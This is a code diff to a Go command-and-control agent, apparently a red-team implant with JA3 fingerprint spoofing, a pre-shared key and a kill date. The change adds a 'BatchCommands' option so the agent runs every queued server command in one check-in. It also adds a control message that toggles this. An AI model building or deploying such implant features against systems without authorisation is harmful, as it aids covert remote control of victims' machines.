@@ -115,6 +115,7 @@ type Agent struct {
 	pwdU               []byte          // SHA256 hash from 5000 iterations of PBKDF2 with a 30 character random string input
 	psk                string          // Pre-Shared Key
 	JA3                string          // JA3 signature (not the MD5 hash) use to generate a JA3 client
+	BatchCommands      bool            // Run all available commands each checkin (vs. one per checkin)
 }
 
 // New creates a new agent struct with specific values and returns the object
@@ -145,6 +146,7 @@ func New(protocol string, url string, host string, psk string, proxy string, ja3
 		URL:                url,
 		Host:               host,
 		JA3:                ja3,
+		BatchCommands:      true,
 	}
 
 	rand.Seed(time.Now().UnixNano())
@@ -428,6 +430,7 @@ func (a *Agent) statusCheckIn() {
 
 	// handle message
 	m, err := a.messageHandler(j)
+
 	if err != nil {
 		if a.Verbose {
 			message("warn", err.Error())
@@ -457,6 +460,7 @@ func (a *Agent) statusCheckIn() {
 	}
 
 	_, errR := a.sendMessage("POST", m)
+
 	if errR != nil {
 		if a.Verbose {
 			message("warn", errR.Error())
@@ -464,6 +468,10 @@ func (a *Agent) statusCheckIn() {
 		return
 	}
 
+	// If the server indicated there were more jobs in the queue to be executed, will run those too
+	if a.BatchCommands && m.Type == "CmdResults" && m.MoreJobs {
+		a.statusCheckIn()
+	}
 }
 
 // getClient returns a HTTP client for the passed in protocol (i.e. h2 or http3)
@@ -907,6 +915,16 @@ func (a *Agent) messageHandler(m messages.Base) (messages.Base, error) {
 				message("note", "Received Agent Exit Message")
 			}
 			os.Exit(0)
+		case "batchcommands":
+			if a.Verbose {
+				message("note", fmt.Sprintf("Updating BatchCommands to %s", p.Args))
+			}
+
+			b, err := strconv.ParseBool(p.Args)
+			if err != nil {
+				c.Stderr = fmt.Sprintf("Could not parse new setting: %s\r\n", err.Error())
+			}
+			a.BatchCommands = b
 		case "sleep":
 			ArgsArray := strings.Fields(p.Args)
 			if a.Verbose {
@@ -1172,6 +1190,7 @@ func (a *Agent) messageHandler(m messages.Base) (messages.Base, error) {
 
 	returnMessage.Type = "CmdResults"
 	returnMessage.Payload = c
+	returnMessage.MoreJobs = m.MoreJobs
 	if a.Debug {
 		message("debug", "Leaving agent.messageHandler function without error")
 	}
@@ -1733,6 +1752,7 @@ func (a *Agent) getAgentInfoMessage() messages.Base {
 		SysInfo:            sysInfoMessage,
 		KillDate:           a.KillDate,
 		JA3:                a.JA3,
+		BatchCommands:      a.BatchCommands,
 	}
 
 	baseMessage := messages.Base{
